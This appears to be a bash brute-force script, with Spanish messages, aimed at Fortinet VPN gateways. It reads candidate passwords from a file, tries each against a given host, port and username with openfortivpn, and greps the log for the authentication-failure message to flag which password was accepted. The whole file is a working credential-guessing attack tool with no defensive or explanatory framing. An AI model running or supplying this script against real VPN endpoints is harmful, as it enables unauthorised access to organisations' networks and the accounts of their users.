#!/bin/bash

while getopts ":t:p:u:v:f:" OPTIONS
do
            case $OPTIONS in
            t)     TARGET=$OPTARG;;
            p)     PORT=$OPTARG;;
            u)     USERNAME=$OPTARG;;       
            v)     VPN=$OPTARG;;
            f)     PASSWORDFILE=$OPTARG;;
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

TARGET=${TARGET:=NULL}
PORT=${PORT:=NULL}
USERNAME=${USERNAME:=NULL}
VPN=${VPN:=NULL}
PASSWORDFILE=${PASSWORDFILE:=NULL}

if [ "$VPN" = "fortinet" ] ; then
echo "fortinet"

    while read password       
    do   
        echo "Server $TARGET:$PORT Usuario: $USERNAME Password $password"
        openfortivpn "$TARGET:$PORT" --username="\"$USERNAME\"" -p $password | tee logs.txt

        egrep -i "Could not authenticate to gatewa" logs.txt
        greprc=$?				
        if [[ $greprc -eq 0 ]];then 
            echo "acceso NO permitido "
        else
            echo "acceso PERMITIDO"
        fi
        echo ""
        
    done <$PASSWORDFILE
fi


